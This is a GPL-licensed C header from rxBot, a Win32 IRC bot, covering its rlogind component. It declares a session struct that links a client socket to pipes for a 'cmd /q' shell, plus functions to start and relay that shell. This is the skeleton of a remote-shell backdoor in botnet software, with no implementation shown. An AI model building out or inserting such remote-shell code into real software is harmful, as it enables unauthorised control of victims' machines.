/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#ifndef NO_RLOGIND

#define BUFFER_SIZE 200
#define SHELL_COMMAND_LINE  TEXT("cmd /q")

#define CHAR_BS		0010
#define CHAR_DEL	0177
#define CHAR_CTRL_C	0003
#define CHAR_CTRL_U	0025

typedef struct SESSION_DATA 
{
    HANDLE ReadPipeHandle;
    HANDLE WritePipeHandle;
    HANDLE ProcessHandle;
    SOCKET ClientSocket;
    HANDLE ReadShellThreadHandle;
    HANDLE WriteShellThreadHandle;

} SESSION_DATA, *PSESSION_DATA;

static PSESSION_DATA CreateSession(int threadnum);
BOOL SessionRun(int threadnum);
static HANDLE StartShell(HANDLE ShellStdinPipeHandle, HANDLE ShellStdoutPipeHandle, int threadnum);
static void SessionReadShellThread(LPVOID param);
static void SessionWriteShellThread(LPVOID param);
#endif
